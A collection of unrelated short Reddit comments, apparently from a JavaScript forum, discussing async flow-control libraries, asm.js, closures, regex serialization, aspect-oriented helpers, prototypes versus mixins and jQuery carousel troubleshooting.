In the following example, where does userdata come from in the second function? (edit: ...and how am I supposed to know that from simply reading the code?) var f = ff( function () { db.authenticate(request, f.slot()); }, function (userData){ graph.addFriend(userData, friend, f.wait()); cache.cacheUser(userData, f.wait()); f.pass(userData); }, function (userData) { response.send("we did it!", userData); } ) .onError(function (err) { console.log("Houston, we have an error", err); });
Curious if async.auto solves your issue of mixing serial and parallel? I find it to be a very straight forward and visually obvious representation. 
That's great! Any chance you'll be putting it on github? I'd love to see what you come up with.
&gt; What do you think it will do if you put "javascript:void(0)" in there? 404. No.
&lt;button&gt; is great... until you set a background image. I can't remember off the top of my head which browser(s) it was, but it created a white 1px border* that couldn't be removed. * The border wasn't even part of the browser's box model ('border: 1px solid #000' could still be set, and would be in addition to the mystery border).
When you say "break out of the function's scope" do you mean referencing variables in the enclosing scope, ie. using the variable `f` inside the `ff` functions? If so, I totally hear you, and I'll say this. Closures in js are indeed a powerful and dangerous thing, and one needs to take special care when leveraging their scoping features. That said, we chose this API because it gave us the right tradeoff between readability and flexibility. As you said, we didn't like how Step overrided the `this` object, but we still wanted inline control of how data flowed between our sequential functions. Using the "`var f`" scheme gave us this tradeoff. In the end, it's a matter of how you like to read your code. To us, using a control variable like `f` to manage sequential vs parellel operations (as well as do things like `f.fail` and `f.succeed` immediately) is preferable to nesting control structures like `async.waterfall` and `async.parallel`. But the beauty of javascript is it's flexibility, and it's up to every developer to decide how they like to structure their code. Your partial example looks really interesting. It's to make it so both async and sync operations have similar signatures (ie. a callback param) so they can all be run through something like waterfall? I never thought of that approach, and it looks really clean. I like it. Your jQuery example is actually very similar to how the Q libary promisifies functions. With FF, we encapsulate this logic inside the `ff()` call so that the `then()` function is immediately available to the return object. It's then up to the developer to decide if they want to use it's promise features or not.
OP's whitespace usage is the worst (consistent) one I've ever seen. Don't put whitespace around your dots dammit. And don't put spaces after ( or before )... 
Why not node-fibers?
well [Promises/A](http://wiki.commonjs.org/wiki/Promises/A) and [Modules/AsynchronousDefinition](https://github.com/amdjs/amdjs-api/wiki/AMD) are really the same thing. Many AMD-style libraries have nearly identical implementations. It's worth noting that I'm talking mostly about the browser. The server is a different beast; I would support a superset of javascript similar to what [netscape did](http://docs.oracle.com/cd/E19957-01/816-6411-10/contents.htm) when they had server-side javascript the first time around to solve some of these problems. It's easy to implement in a way that [doesn't break the parser](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Functions_and_function_scope/Strict_mode). People are comfortable with Event and GoF [IoC](http://en.wikipedia.org/wiki/Inversion_of_control) containers and really this can be implemented through three ways: * DOMEvent watching ([DOM3](http://www.w3.org/TR/DOM-Level-3-Events/#events-mutationevents) deprecating mutation events provides some complications (mostly code split)) * Simply firing an event at the end of the file (this is the most trivial) * Using [Object.watch](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/watch) when available, and doing a setInterval on the object when not (this isn't great) There's a few other ways too. But require.js abstracts away the breadcrumb trails that the existing ecosystem of tools uses in order to diagnose problems. It's also ordinally specific and can have things just not ever run with very little indication of success. It's what's termed "callback-hell" in asynchronous event-driven design-based paradigms. There's ways out of it - but really, I see a lot of bad practices being advocated as advancements. You effectively need to hoist a tracing and logging infrastructure on top of the system because of a failure to creatively leverage existing systems. And this unnecessarily increases the work-effort required to diagnose and address problems. So the aggregate cost of this approach with the purview of a complete SDLC, I think, is at best, a net-zero. Every infrastructural dependency you add should increase the tractibility of problems. These don't. Clearly I get a bunch of downvotes here so I don't think I can positively affect change. So I'll just stop here.
promises are promises are promises. pretty much. which is one of the nice things. I tend to use jQuery because i write code that runs on both client and server, and thus jQuery is already available. The backbone.sync method also returns jquery promises for most of the REST requests it makes. I really got the hang of all this stuff when i was busy writing some fairly complex csv import routines a while back. I found that by referring to stuff outside of the function, it made my code much more complex than it needed to be. This becomes exacerbated when you have multiple nested processes as well. So _var f_ is different based on which function you define the function in. So you become limited to where you can define your functions, and I really dislike inline functions beyond a few lines (this is the source of the callback pyramid after all). By not referring to variables outside the function, i was eventually able to abstract the whole process out into a very small set of helper functions i could stick in a separate include, and the individual workflows to import files were incredibly succinct. Adding new imports, or modifying them, became child's play. it ended up becoming something like this pseudocode. : async.waterfall([ getImportFiles('/path/to/dir'), processFiles([ cleanColHeaders(['firstName, lastName', 'balance', 'geo']), processRow([ generateId('userId'), forceFloat('balance'), lookupGeoCoords('geo'), uppercase(['firstName', 'lastName']), saveToCouchDB('myRecords') ]) ]) ]), next); // the individual helpers were pretty simple too function processFiles(tasks) { var tasks = [fs.readFile, parseCSV].concat(tasks); return function(files, next) { async.parallelLimit(files, tasks, 3, next); // only parse 3 files at a time } } I could probably have taken it further, and imported the credentials for each of the record types from a csv file in itself, without breaking a sweat.
I hear ya, it's a huge mental leap going from synchronous programming to asynchronous or multi-threaded programming. But in the end it makes you a better programmer learning to think this way. Good luck with your Obj-C futures, and ping us on our mailing list if we can help in any way. I'm not personally an iOS developer, but we've got a few around here: https://groups.google.com/group/game-closure-devkit/
Ah I see what you mean. I think the API you are looking for is something like this: var f = ff( function () { f.next(db, db.authenticate, request); }, // etc... ) So, f.next would curry the authenticate function, applying the db as context, and the request object as a parameter, and then forward the results of the callback to the next function. It's an API that is similar to how `promisfy()` works in, say, [Bogart](https://github.com/nrstott/bogart/blob/master/lib/q.js). I can see how that would be more familiar to you if you're used to libraries like Q or [promise-io](https://github.com/kriszyp/promised-io). In our case, we iterated on the approach taken by [Step](https://github.com/creationix/step), and so our API more parallels that than Q. That said, it would not take much work to make FF also support the method you are talking about. And so I eagerly welcome pull requests!! :)
Once you download a file, you will see it looks ok. In the browser you may have problems watching raw tab-spaced files
Very true, `async.auto` can be used to solve the problem of mixing parellel vs. synchronous operations. I actually like that idea of dependency based flow logic as well. I didn't mention it in the blog post because I thought `Step.parallel` was more straightforward to explain, but you are absolutely right to call it out. I will say though that FF has a few features that `async.auto` doen't have, namely the ability to break out of the chain at any point with `ff.succeed` and `ff.fail`. And also that `ff()` returns a promise, and so can be used interoperably with other promise libraries.
Very cool! Just a remark: if the intent is to show how the game works, the animation is misleading. It seems you try to match each destroyed cube to a near newborn cube, but the two events are unrelated.
I can't tell if you're trolling me or not, because in the early days of nodejs there was actually [very heated discussions](http://groups.google.com/group/nodejs/browse_thread/thread/c334947643c80968) on the mailing list about how to handle asynchronous results. Both promises and co-routines (fibers) were included in the early versions of node core, but were quickly removed since it was decided ([somewhat controversially](https://groups.google.com/forum/?fromgroups=#!topic/nodejs/GDqkQzmnwHM)) that the current callback scheme was the most straightforward way of going about things. In any case, I'm going to give you the benefit of the doubt and answer your question, since it is indeed a legit one. Node fibers are great. When we first started working with node, we were coming from a python background, and we were both excited about and dubious of co-routines (we used eventlet). We like the synchronous looking API, and the power and concurrency they provided. But we did not like debugging it when things went wrong. So when we came across Tim Caswell's [gist](https://gist.github.com/creationix/1524578), we realized we could do things the callback way, but not write absolute spaghetti code. To us, this was the most preferable approach. That said, fibers are a nice powerful concurrency API, and I commend anyone with the courage and knowhow to use them correctly.
I see what you did there
You can use firefox's offline reader feature or you can save it to pocket app.
It looks the same with the non-raw file, and it looks the same in sublime text 2. 
thanks for the pointers! Will give it a spin.
Agreed. If you really like that animation, could we perhaps have a "traditional" option, where cells appear/disappear out of nowhere?
If you're still unsure, try reading [the chapter on functions in Eloquent JavaScript](http://eloquentjavascript.net/chapter3.html) in case it suits you better. By the by, another thing you ought to try and wrap your head around is that properties of objects are accessed by reference: var multiplied = {}; multiplied.number = 5; function timesTwo(obj, number){ obj.number = number * 2; } timesTwo(multiplied, 4); console.log(multiplied.number) // prints '8'
I think your coding style is just weird then. Some lines are indented with over 60 tabs. I'm sorry, but that is insane.
Not trolling at all, I'm new to Node.js, also w/ Python/gevent and Erlang backgrounds, so I'm fine w/ coroutines. Now I'm using express + fibrous (wrapper API for node-fibers) to build web apps. Ran through the discussion and arguments against coroutines looks a bit weird to me... basically all goes around keeping simplicity for beginners, the point, I think, a bit over-emphasized — I just don't feel coroutines is a difficult concept to grasp. Just curious, can bring some light to the debugging problems you encountered while working w/ fibers? 
Does anyone know if other browser vendors have made announcements regarding support for this?
&gt;The only limitation in web apps is the limitation of people constantly trying to hold it back. If some people disagreeing on reinventing some apps are enough to hold back web apps, then web browsers have bigger problems. Web standards and implementation are holding web browsers back, that's just a fact, it's the same with all other competing standards/implementations. If you want to reinvent sed, grep, find, git, hg etc in the web browser, fine; I don't care. Just don't expect me to like it. I find that existing tools offer me much more. For instance; I can extend any CL programs with any other programming language I want. You just don't have as much control over web browsers than you have for other operating systems like Linux distros, Mac OS X, and Windows. I'd love for web browsers to give us access to the VM directly (maybe dart vm). But it's just funny when I see stuff like the dart programming language, writing "optimized javascript." You know that competing implementations are a problem when people are creating compilers that attempt to churn out optimized javascript instead of optimized bytecode. Web browsers are great for apps wrapped around databases such as facebook. "Low-level" apps are great for taking advantage of hardware such as video games and simulations.
what is it? 
It's sort of a subset of JavaScript, if your code conforms to it then the browser is able to compile it and give better performance than when it has to account for some of the more dynamic features of JavaScript. It's particularly useful for those "language x to JavaScript" compilers so they can optimize their output. At least that's my understanding of the whole thing.
I have a Samsung SynMaster 2343. Wish I bought more at the time...
youtube and some other sites don't like to load in frames :/
These cases are rare. We wanted to avoid creating new functions just for the sake of using them once, so, we created anonymous functions, and used the tabs to separate them visually. Performance is better this way and you have to scroll horizontally if you want to work on something that is that deep. Debugging is unaffected too.
TameJS has a very interesting approach to callback hell. It compiles your tameJS code (code which looks synchronous, but actually isn't) into asynchronous javascript for you. I actually haven't worked with it personally, but it seems like a cool idea. Have you worked with it? I'd be eager to hear about your experiences.
Is there any automated way to convert regular JavaScript to the asm.js subset?
Couldn't it use some form of type inference? eg see [Tern](http://ternjs.net/)?
I guess one could make a system to dump the compiled information from SpiderMonkey. Like a "cache everything we guessed about the types to a file". Tern seems to be using something like this too. Anyway, you could start by manually moving to asm.js the most used functions, especially those which do a lot of math. 
createComparisonFunction doesn't know anything about objects 1 &amp; 2. It's job is to create a function that will accept objects 1 &amp; 2 as parameters, and compare them based on whatever was passed in the first place. It's the *returned* function that then gets passed to sort, which then arranges to pass it objects as needed.
`createComparisonFunction()` runs to completion and returns before the sort even begins. Look again at its name: this is a function that returns a function. When you write this: data.sort(createComparisonFunction("name")); ...it's the same as if you'd written this: var theComparisonFunction = createComparisonFunction("name"); data.sort(theComparisonFunction); The inner function is the return value of `createComparisonFunction()`, and it's what is passed to the sort method. Objects are never passed to `createComparisonFunction()` for comparison, they're passed to the function that `createComparisonFunction()` returned.
There is http://jsbeautifier.org if you want your code to look nice effortlessly.
This is really interesting, thanks for posting. One comment: I think the example in the README could do with a bit of re-thinking, because JavaScript generally doesn't do synchronous IO like: function perform_db_operation() { open_db_connection(); write_data(); close_db_connection(); } 
It's not based on PrototypeJS, it's inspired by it, though. Global Element's prototype isn't extended, Elements is a wrapper. Also, as you can see there https://github.com/mlbli/craft/blob/master/dist/docs.md#craft, a bunch of functional methods are used, and ES5-like methods are being rewritten instead of using proper ES5 ones when available, which gives a little more cross-browser consistency and performance (as you can see there : http://jsperf.com/craft2-vs-underscorejs/2). 
I normally don't nitpick spelling, but "scrapped" is something thrown away. I think you meant "scraped together" :-)
Why are you calling it "aspects"? This is essentially an event system like Node's [EventEmitter.](http://nodejs.org/api/events.html) (But does it allow multiple listeners, does it allow values to be emitted to the listeners, can the method allow listeners to cancel the event?) JavaScript doesn't need a heavy Java-style Aspect Oriented Programming framework because of its dynamic nature. If you want to instrument behavior before and after the method call, just wrap it in another function, then replace the original function in the variable or property with the new one.
**Edit:** Hello, everyone. I've updated the GitHub page with the following demo: [Validation Demo](https://github.com/Pritchard/jAspect/blob/master/Validation%20Demo.html) That comes with (insecure) user profiles, logging, error handling and authentication of sorts. I hope it better demonstrates the potential use of aspects in JavaScript. **Original Post:** A big +1 for common sense. Thanks for your comment. Definitely something I should address. An example that applies validation, logging, error handling and some kind of filtering (say, authorization with a simple cookie) may be more practical and could be written 100% in JS. My initial motive was to apply validation and filters (something like C# attributes) to functions. Aspects can fulfill that to an extent. I hope to revise the examples before Monday :)
Thats the one. With multi monitors it really shines if you reuse the same layouts all the time. 
Can't you use the regular RegExp constructor, or do I misunderstand the problem? r = new RegExp(your object key as a string)
close, but /abc/i.toString() produces '/abc/i' and new Regexp('/abc/i') produces /\/abc\/i/ hence: the delimiters (slashes) and options are part of the pattern. eval(regexpAsString) will work, but you must be sure the string contains a stringified regexp.
So then... Get rid of the first and last / and pass the flags as the second argument to the constructor. "Now you have two problems."
Have you considered storing the regex based on the same key? that way you can just retrieve it.
&gt; JavaScript doesn't need a heavy Java-style Aspect Oriented Programming framework because of its dynamic nature. If you want to instrument behavior before and after the method call, just wrap it in another function, then replace the original function in the variable or property with the new one. Part of the point of Aspects, is that you only describe the points, rather then specify them explicitly, and the compiler/whatever will go off and search for those points for you. So you don't attach onto things because you *know* it's there, you attach *if* it's there. This means you don't have to manually list each and every function, method, class, that you are attaching behavior onto, and as you write code, aspects get attached onto new code automatically. That allows you to do things like attach onto every getter method, for every class, without caring what it is getting, or what classes have getters, if any. i.e. *.get* From the looks of it, this library doesn't offer that searching for point cuts.
Nice work so far. I appreciate a function-centric approach (in contrast to Flight's method-centric approach). And 84 SLOC is also solid. :-)
Thanks! :)
I tried doing this: var timeoutSet = false; //in event handler: if (remain&lt;=0.01&amp;&amp;!timeoutSet){ setTimeout(function(){ this.currentTime = 0; a.play(); timeoutSet = false; },(remain*1000)-LOOP_DELAY); timeoutSet = true; } Which should prevent the second timeout, but it does nothing, which leads me to believe something is going on behind the scenes in Firefox. **Edit** After doing some debugging, I've found that a.duration in Firefox represents the total length of the track, but in Chrome it returns NaN. Does this have something to do with the fact the Chrome uses MP3 and Firefox uses ogg vorbis?
Thanks for the comment. Correct. The best I was able to do while sticking to the principles of "simple to use, easy to implement" was fiddling around with the terminology a bit and allowing users to register advice methods on "join points". I apologize to any devoted aspect-oriented programmers who wanted something more. I'm not sure what else I could implement without violating those principles.
Here's a little conversion table that may be helpful, if slightly confusing. I've skipped a few combinations that aren't really beneficial. From|To|Method -|-|-| RegExp|string|`RE.toString()` RegExp|args|`[RE.source, (RE.global ? 'g' : '') + (RE.ignoreCase ? 'i' : '') + (RE.multiline ? 'm' : '')]` string|args|`/^\/(.+)\/([gim]*)$/i.exec(string).slice(1)` args|RegExp|`RegExp.apply(null, args)` string|RegExp|`RegExp.apply(null, /^\/(.+)\/([gim]*)$/i.exec(string).slice(1))` Here is some code applying these methods: // using regexes, provided a string var parse_string = /^\/(.+)\/([gim]*)$/i, string_to_args = function(string) { return parse_string.exec(string).slice(1); }, string_to_re = function(string) { return RegExp.apply(null, string_to_args(string)); }; // not using regexes, provided an args list var re_to_args = function(re) { return [re.source, (re.global ? 'g' : '') + (re.ignoreCase ? 'i' : '') + (re.multiline ? 'm' : '')]; }, args_to_re = function(args) { return RegExp.apply(null, args); }; **Notes**: - The veracity of the regex `/^\/(.+)\/([gim]*)$/i` is debatable, of course. You can avoid it entirely by using the `RegExp -&gt; args` method. - You can't use an args list as a key, so just store it with the regex string in your object.
If you are fully certain all your keys will be regexps, the most compatible and straightforward way to solve your problem is with `eval`. If you're using node, or targeting Firefox, you can try using a `Map`: var re = /abc/i; var reMap = new Map(); reMap.set(re, 'hey!'); reMap.get(re); // == 'hey!' Note for node you'll have to start it with the `--harmony` option for `Map` to exist. Note that you'll have to use the exact regex object, using a literal won't work (`/abc/i !== /abc/i`). Another option would be to store the regex along with the value, something like: var re = /abc/i; var obj = {}; obj[re] = { regex: re, value: ['stuff', 'to', 'store'] }; I think the last option is the safer and more performant one, but it might not exactly fit your problem space.
I'll take a flow chart over a sequence diagram any day but this looks really nice. A good competitor.
Just use CoffeeScript, indent two spaces, and call another function sometimes. ec2.runInstances params, (err, data) -&gt; if err? console.log 'There was an error launching the instance:' console.log err else console.log "Instance launched:" console.log JSON.stringify(data, null, 4) console.log "Waiting for boot and initialization.." interval 2000, -&gt; which = InstanceIds: [ data?.Instances?[0].InstanceId ] ec2.describeInstanceStatus which, (err, data) -&gt; if err? console.log 'Error getting instance status.' console.log err else process.stdout.write '.' status = data.InstanceStatuses?[0].InstanceState?.Name if status is 'running' showInstanceDetails which.InstanceIds[0] There is also LiveScript (http://livescript.net/) which has backcalls: data &lt;-! $.get 'ajaxtest' $ \.result .html data processed &lt;-! $.get 'ajaxprocess', data $ \.result .append processed (These are both languages that compile to JavaScript.) 
I quite like the idea of this. It is simple and the regex does not need to be reconstructed. I am iterating over the objects anyway so the key is not super important. I just need the regex.
Yea the last one is what i will go with. Cheers
&gt; If you want to instrument behavior before and after the method call, just wrap it in another function, then replace the original function in the variable or property with the new one. I've also done a fair chunk of this kind of work, and ended up with two completely different approaches. [YouAreDaChef](https://github.com/raganwald/YouAreDaChef) is a heavyweight approach similar to jAspect. One of the goals with YouAreDaChef was to make method advice inheritable. So if you have some before advice for a method and you override the method, you get the before advice. Wrapping methods doesn't have this property. Another goal was to make it manageable for debugging, so YouAreDaChef is introspective: You can get a list of the pieces of advice for a method. You may or may not like that approach, but it does have a certain valid use case that wrapping methods doesn't serve. The other approach I've used is to go very lightweight and write method decorators. I wrote a small combinator library called [method-combinators](https://github.com/raganwald/method-combinators) to help with that, it's closer to what you're advocating. jAspect seems to take a third way forward, and it looks interesting to me. 
The method-combinators look great, raganwald. Architecturally, they seem to fit in better with async (which I see they have support for) and promises, things I'm still wondering how to approach with jAspect. jAspect intends to be a very simple, almost imperative means of separating concerns. Sure, there's support for late binding (that's just JavaScript), but it isn't attempting to be a framework (the callbacks offer a minimal form of IoC). jAspect is simply an extension of functionality that shouldn't require pre-existing programs to undergo architectural changes. While admittedly cool, supporting method-combinators or YouAreDaChef may require refactoring - essentially, isolated architectural changes. jAspect would allow my company to separate concerns in some of our (sometimes messy) pre-existing JavaScript code used for AJAX requests, dialogs, and data transfer between callbacks. Thanks for your comments. I think your code is great :)
When I first used websequencediagrams.com, I had the same idea but never worked on it. This is great.
This is great. Good work.
Yeah, jAspect looks very cool, I like where it's going. The big impetus for YouAreDaChef was to to have a very structured way to monkey-patch existing code. That way, you could have some gnarly BigBallOfMud class and add functionality to it after the fact with advice, thus keeping the original code intact but adding the new functionality in a new file. Obscure programming style, but it worked and then I tried using it from the very beginning and that worked too. But method-combinators is a completely different beast, it's like comparing a commercial truck to a light airplane. They both have engines and they both are transportation, but... And now we have jAspect for when you need a sports car. I think that's a good thing!
I'd really like to use this for documentation purposes. Is there any easy tweak to allow HTML (e.g. for URLs) instead of just plain text? 
Gotcha, so instead of `succeed()` or `fail()`, with `async.auto` you can just invoke the callback with an error. That does work, but in cases where I want to break our of a chain (without an error), I'd rather call `f.succeed()` than returning an error. But I agree it's just semantics.
um.. Flow charts and sequence diagrams aren't really interchangeable. 
&gt; Then what's the point of declaring 'multiplied' (local) when you are trying to call the function from the outside? Are you asking why you'd want to have a local variable at all or are you asking why you'd have two variables of the same name? Being self-taught I'm really no good at explaining the computer science bit so do point out if you find this odd sounding: A local variable is of use because it allows for [separation of concerns](http://en.wikipedia.org/wiki/Separation_of_concerns). If you only had global variables then you'd have the risk of 'variable collision' where one part of your program would affect some completely different part of your program. Why have two, or more, variables with the same name? That's circumstantial but at the very least, for any larger application, you are likely to have some 'abstract' names you'd reuse such as the common `i`, `j`, `k` in loops, `aObject`, `aNumber`, `aFunction` as function arguments, and similar. If you're referring to the code in my comment then it's not about local versus global variables. Rather it is about how property access is handled. Take this for example: var myObject = {}, myVar = 'unchanged'; myObject.a = 'unchanged'; myObject.b = 'unchanged'; function setObject (aObject, aProp) { aObject[aProp] = 'CHANGED'; } function setVar (aVar) { aVar = 'this has no bearing outside this function'; } setObject(myObject, 'a'); setVar(myObject.b); setVar(myVar); console.log('myObject: a =', myObject.a, ', b =', myObject.b); // myObject: a = CHANGED , b = unchanged console.log('myVar =', myVar); // myVar = unchanged Did that help?
I like how the lines are randomly squiggly. If you quickly add and delete a letter it looks like an episode of Ed, Edd n Eddy.
anyone interested?
Firefox itself could also benefit from this to a large extent, given that a large portion of Firefox is written in JS; for example, the new PDF.js viewer probably does a lot of complicated stuff that could be speeded up by carefully converting the functionality required (tokenizing and parsing PDF, doing layout etc.) into islands of soft-typed code.
One way would be unifying the WhateverMonkey execution mechanism to fully support the mixture of soft-typed and dynamically-typed code. Any given VM doing high performance stuff needs to have *some* sort of check-removal and optimization functionality. In classic JITs, you introduce inline caches to speed up dynamic lookups and to provide type feedback. Once you have the type feedback, you generate specialized versions of code. IonMonkey, if I recall correctly, also adds some type inference to the mixture. Manifest typing (be it the classical one or the ASM.js-like one) could be just another source of information. It seems to me that one should be able to write a VM that allows you to generate native code from a type-annotated intermediate form, with the annotations coming from these three different sources (1) run-time type feedback, 2) compile-time and run-time type inference, and 3) compile-time manifest typing). You could, for example, start with a simple type inferencer, and as you get better at it, you'd simply push more stuff into the type-inferred regions of code, with neither the programmer nor the code generater actually noticing that the implementation has changed.
In truth, the only way to get better is to write a lot of bad code and read as much good code as you can find. Books can help shorten the learning curve, I recommend Crockford's book and Addy Osmani's book on javascript design patterns. I thought I knew javascript, but all I really knew was C-style syntax.
Look at CoffeeScript before trying anything else. Python developer should feel right at home with it (with list comprehension, class syntax, ...). And no need to type 'function', ever ;-).
If I found the same one, [this is the actual webpage for it](http://marionettejs.com/). If you don't want to open up the page, this is the `About` section: &gt; Backbone.Marionette is a composite application library for Backbone.js that aims to simplify the construction of large scale JavaScript applications. &gt;It is a collection of common design and implementation patterns found in the applications that we have been building with Backbone, and includes pieces inspired by composite application architectures, event-driven architectures, messaging architectures, and more.
Indeed we do :: http://blog.codepen.io/documentation/pro-features/collab-mode/
As a heavy chrome developer, I am officially jealous.
JavaScript's prototypal inheritance is closer to functional programming than OOP. YOu have to discard quite alot of the existing OO notions to get comfortable coding in JS. There are workarounds and design patterns to attempt emulation of some OO patterns but I found that half-hearted emulations would come back to haunt you sooner or later. It's true that JavaScript gives you way too much freedom so even without any of the OO capabilities, there could still be much difficulties trying to find a comfortable standard which works for the long term. Never fear, the roots of EcmaScript is What you could do is: - Really try tounderstand anonymous functions, scope, function prototypes, self-execution, closure, asynchronous callbacks. Some may seem straight forward but others like scopes and closures could take months to sink in. For example, don't feel discouraged if you still don't understand why the scope changes this way, that's both a power (and curse) of JS. - Read lots of good code, maybe starting with some libraries. jQuery, backbone.js, underscore.js source code with comments is a good example. Take note of the structure and the way data gets passed around. - Study anti-patterns and JS don'ts (trust me, there are way more of them than dos). Learn to refactor based on how to avoid those pitfalls. - Keep writing code and look back after awhile then improve them. I guess learning JS is the same as learning any languages, you would write some really smelly codes in the beginning and slowly get better.
I'm animation basic cs concepts like sorting algorithms and other basic algorithms. My first attempt using kinetic.js is at www.cs-101.com (please ignore the horrible horrible js code). I'm planning on using processing.js this time, but the logic of handling objects in the canvas and moving them around seems to need a proper OO design so that I can expand it to more algorithms. 
To someone who has never played angry birds the naming convention doesn't make a whole lot of sense, but the stuff about finite state machines and other patterns looks like fun.
Nice article. However, I think it lacks a discussion about when and why one would use prototypes instead of mixins. Personally I'm very happy to use mixins, and do not use prototypes unless I have to or performance requirements mandate it. Prototypal-oriented code tends to be more involved and confusing than mixins, which are very straightforward and do not get themselves tangled up in some weird pseudo-classical inheritance concept and the **super-weird** *new* keyword. http://javascriptweblog.wordpress.com/2011/05/31/a-fresh-look-at-javascript-mixins/
Take a look at TypeScript (http://www.typescriptlang.org/)
var ClassName = function() { this.instanceField = 1; } ClassName.prototype = Object.create(ParentClassName); ClassName.StaticFieldOrFunction = 1 ClassName.prototype.InstanceFunction = function() {} It's not really that hard, very minimal, nothing extra needed ( like an extend function )
I especially like his mixin as verb approach: "Mixins as verbs instead of nouns; lightweight one stop function shops."
That's because neither `object1` nor `object2` are defined within `createComparisonFunction`. Those two variables are defined only when the anonymous inner function is executed. For what it's worth, your question isn't really about the sort function, but about variable scope in functions that return functions.
The reason it's weird is because it's required when you deal with prototypes, unless you have a very modern JavaScript engine (think not IE). There are many ways to create objects in JS, and the keyword *new* definitely does not belong in JS. It is superfluous and confusing, and its misuse frequently causes bugs in code. Edit: I think the reason you don't find it weird, is because it doesn't do what you think it does. It's not immediately obvious what the *new* keyword does in a language that does not have classes.
Think you might be looking at it from a more experienced point of view. Talking about prototypes and inheritance is something that's very complicated for new developers. Your first line made me giggle a little because it uses _this_ which is something else that is notoriously complex for newbies. In the end it all comes down to personal preferences though. I rarely use inheritance and try to stay away from _new_ and _this_. Also mostly you are trying to tie methods onto some data object (from database, api, ..). For me it makes sense to extend that object with methods instead of passing it to a constructor and setting it up there.
This would be immensely useful to the folks over in /r/learnjavascript (though I imagine a lot of them are subscribed here to. Prototypes seem to be one of the main elements of the JavaScript language that beginners can't wrap their heads around. Great article by the way.
never mind I got it working
So, what does new() do that OO guys won't appreciate?
First of all, new is not a function - it's a keyword added before a function call. This answer explains it pretty well: http://stackoverflow.com/questions/1646698/what-is-the-new-keyword-in-javascript Basically, it results in a function call that does things behind the scenes. Furthermore, it does not call any super constructors, which a lot of OO guys might expect it to do. Also: http://joost.zeekat.nl/constructors-considered-mildly-confusing.html
Compared to all the other options I know about, this seems to be the most logical approach. I like it. 
And if you're only going to use the object once (or rather, only have a single instance at a time)? Is there any reason to use prototypes then?
Well, I'm still a beginner myself but I think I can help you with a few things. First, you are calling a click event on the #button ID but your button doesn't have an ID. You should remove the hash or add one. The way you created your compare function is also confusing me. I would just create it normally and I don't think it has to be inside (document).ready. I'd do something like function compare(choice1,chocie2) and then store the result inside a variable. var result = compare(userChoice, computerChoice);. If you then want to show the result inside your div you can do document.getElementById("rockPaperScissors").innerHTML = result; Your compare function might actually work but then compare would already hold the result, I don't think you have to call it a second time at the bottom. Also, you don't have to call your js file inside the div, you can just put it in the header with your css file.
JSHint help you(http://www.jshint.com/)
I guess you're talking about intro.js: http://usablica.github.com/intro.js/ mentioned here : http://www.reddit.com/r/javascript/comments/1aeu1v/introjs_a_better_way_for_new_feature_introduction/
RoR, CoffeeScript, Mac... this guy is doing everything wrong.
The parallel for that to me is a static class. For readability consistancy I do: var StaticClass = function(){}; StaticClass.StaticFieldOrFunction = 1;
You can keep callbacks under control without any special abstractions. [callback hell](http://callbackhell.com/) describes how with named, shallow functions and modules. From there, domain-specific abstractions like EventEmitters and Streams from [node core](http://nodejs.org) can help with writing better modules.
Hi fellows, I wrote this tutorial about a week ago, and I would appreciate your feedback on it.
I skimmed through the jCarousel documentation and found a setting that fixes your problem. Add: **scroll: 1** as a parameter to your carousel initialization. It will look like this: jQuery('#mycarousel').jcarousel({scroll: 1}); Here's a jsfiddle: http://jsfiddle.net/thejohnsmith/qWudB/ I also added **wrap: 'circular'** so it loops back to the first slide when it's complete. Best of luck! 
That's it! Thank you.
Yeah, if you aren't familiar with the game then it may seen a little odd. I am trying to take the strength of each bird and match them to some type of JavaScript idea. I was hoping to keep things interesting and educational. 
Also, [trip.js](http://eragonj.github.com/Trip.js/#) is lightweight and easily extensible.
I was about to ask "Is this all applicable across common browsers?", but then I saw that question answered with a link in the comments to the article, so: http://kangax.github.com/es5-compat-table/
now i get it! thanks for the tip.
Thank you so much for your response! The problem I am having though is that the code in my "jquery.jcarousel.pack.js" looks so different. The majority of it looks like: "4.1b(9(){3p r(4,o)})};8 q={Z:F,25:1,21:1,u:7,1c:3,15:7,1K:\'2X\',2c:\'2Q\',1q:0,B:7,1j:7,1G:7,2F:7,2B:7,2z:7,2x:7,2v:7,2s:7,2p:7,1S:\'&lt;P&gt;&lt;/P&gt;\',1Q:\'&lt;P&gt;&lt;/P&gt;\',2m:\'2l\',2k:\'2l\',1O:7,1L:7};$.C=9(e,o){4.5=$.16({},q,o||{});4.Q=F;4.D=7;4.H=7;4.t=7;4.U=7;4.R=7;4.N=!4.5.Z?\'1H\':\'26\" So I am having trouble finding where to put the scroll: 1 and the wrap: 'circular', I have tried finding the line "jQuery('#mycarousel').jcarousel" but am unable to find in the "jquery.jcarousel.pack.js" or the jquery-1.3.2.min.js" Sorry if I am being a noob, as I am one. Thank you for your help!
Use codecademy.com instead of a book. I was able to learn the basics in a week. 
Yea, it's basically this. If you're using Backbone, Marionette is some useful stuff on top of it, including some stuff you would have to write anyway.
No worries bud! It looks like your version of the jCarousel is mostly obfuscated(meaning that it's been purposefully rendered unintelligible; which makes it harder to reverse-engineer the code) but the good part is that you don't technically need to understand the code to implement it's functionality :) In my jsfiddle I added the external script from jCarousel's github location. (https://raw.github.com/jsor/jcarousel/0.2/lib/jquery.jcarousel.min.js) So, that being said... the simple answer is to update the javaScript code that actually creates the instance of your new jCarousel(this is what I was referring to as 'your carousel initialization.') In your source-code I can see a javaScript tag within the &lt;head&gt;. Inside this is your carousel setup: jQuery(document).ready(function() { jQuery('#mycarousel').jcarousel({}); }); Here's a screen shot: http://i.imgur.com/XjEjmsB.jpg Does this get you any closer to the fix? 
I stand corrected - I think I was confusing it with virtual destructors in C++, which, as I recall, are called automatically up the inheritance chain when you delete an instance.
[JavaScript: The Good Parts](http://shop.oreilly.com/product/9780596517748.do) Not only because it tells you how to use JS and what to avoid, but also because it has more of a general programming perspective, rather than a browser-script-snippet-hack-make-things-work perspective. It isn't concerned with DOM manipulation at all, which is a relief. It is a dense, straight-to-the-point kind of book. I imagine that the contents would be difficult to digest for a beginner programmer, but for someone already comfortable with programming, it's excellent. 
Just wanted to note that this sha1 implementation now works with asm.js and runs within half of native speed! Let me know your thoughts...
An old meme, a sloth, boobs. 
Hey Derick - I just want to say thanks for Marionette - and your articles on WinJS.
Both C++ and Java call the parent constructor automatically without you needing to add anything. You're thinking of cases where you want to pass in an argument to the parent constructor, which requires a super() call in Java or an explicit constructor call in the initialiser list in C++.
No, you were right - see my comment above.
Youre missing apostrophes.
